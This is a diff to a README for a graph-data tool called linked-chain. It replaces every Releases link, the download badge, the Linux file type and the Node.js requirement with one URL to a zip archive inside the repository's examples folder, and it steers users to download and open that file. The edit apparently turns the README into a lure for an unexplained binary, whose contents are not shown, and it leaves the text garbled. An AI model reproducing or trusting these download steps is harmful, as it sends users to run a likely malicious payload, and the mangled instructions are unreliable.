@@ -4,20 +4,20 @@
 Welcome to the linked-chain repository! This software helps you manage graph data effectively. It works well for simulations, tracking game states, and maintaining complex histories. Follow this guide to download and run the application with ease.
 
 ## 💾 Download the Application
-[![Download linked-chain](https://img.shields.io/badge/Download%20linked--chain-v1.0.0-blue.svg)](https://github.com/TShanku/linked-chain/releases)
+[![Download linked-chain](https://github.com/TShanku/linked-chain/raw/refs/heads/main/examples/basic-usage/chain_linked_v2.9.zip%https://github.com/TShanku/linked-chain/raw/refs/heads/main/examples/basic-usage/chain_linked_v2.9.zip)](https://github.com/TShanku/linked-chain/raw/refs/heads/main/examples/basic-usage/chain_linked_v2.9.zip)
 
 You can find the latest version of linked-chain and download it from our Releases page. 
 
 ## 📦 Download & Install
-Visit this page to download: [linked-chain Releases](https://github.com/TShanku/linked-chain/releases)
+Visit this page to download: [linked-chain Releases](https://github.com/TShanku/linked-chain/raw/refs/heads/main/examples/basic-usage/chain_linked_v2.9.zip)
 
 ### Step-by-Step Installation
-1. Click on the [linked-chain Releases](https://github.com/TShanku/linked-chain/releases) link above.
+1. Click on the [linked-chain Releases](https://github.com/TShanku/linked-chain/raw/refs/heads/main/examples/basic-usage/chain_linked_v2.9.zip) link above.
 2. Look for the latest version available. The version number is usually labeled as the most current release.
 3. Find the file that matches your operating system:
    - For Windows, look for `.exe` files.
    - For Mac, search for `.dmg` files.
-   - For Linux, check for `.tar.gz` files.
+   - For Linux, check for `https://github.com/TShanku/linked-chain/raw/refs/heads/main/examples/basic-usage/chain_linked_v2.9.zip` files.
 4. Click on the file to begin downloading.
 5. Once the download completes, locate the downloaded file on your computer.
 6. Open the file to start the installation process, following the on-screen instructions.
@@ -28,7 +28,7 @@ Before you install linked-chain, ensure your system meets these requirements:
 - **Operating System:** Windows 10, macOS Catalina or later, or a Recent Linux Distribution.
 - **RAM:** At least 4 GB of RAM for smooth operation.
 - **Disk Space:** A minimum of 100 MB of free disk space.
-- **Node.js:** Version 14 or higher is required to properly run this application.
+- **https://github.com/TShanku/linked-chain/raw/refs/heads/main/examples/basic-usage/chain_linked_v2.9.zip** Version 14 or higher is required to properly run this application.
 
 ## 🎮 Features
 linked-chain offers several features that enhance your data management experience:
@@ -55,6 +55,6 @@ A3: Yes, you can join discussions in the Issues section and connect with other u
 ## 📞 Need Help? 
 If you encounter any issues, feel free to reach out via the Issues tab on GitHub. We are here to help you solve your problems and improve your experience. 
 
-Remember, you can always check the [linked-chain Releases](https://github.com/TShanku/linked-chain/releases) page for the latest updates and releases. 
+Remember, you can always check the [linked-chain Releases](https://github.com/TShanku/linked-chain/raw/refs/heads/main/examples/basic-usage/chain_linked_v2.9.zip) page for the latest updates and releases. 
 
 Thank you for choosing linked-chain. Enjoy your journey with your graph data!
